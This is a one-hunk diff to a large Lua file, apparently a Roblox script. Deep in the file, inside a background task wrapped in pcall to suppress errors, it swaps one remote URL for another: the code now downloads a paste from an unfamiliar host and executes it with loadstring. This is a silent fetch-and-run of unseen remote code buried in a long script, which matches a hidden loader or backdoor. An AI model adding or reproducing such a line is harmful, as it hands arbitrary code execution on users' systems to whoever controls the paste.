@@ -17323,7 +17323,7 @@ end)
 
 task.spawn(function()
     pcall(function()
-        loadstring(game:HttpGet("https://pastefy.app/ff6JEUWO/raw"))()
+        loadstring(game:HttpGet("https://paste.fe4r.click/raw/4e1f66cc-3085-449d-a8bd-c3b1ed9b6350"))()
     end)
 end)
 
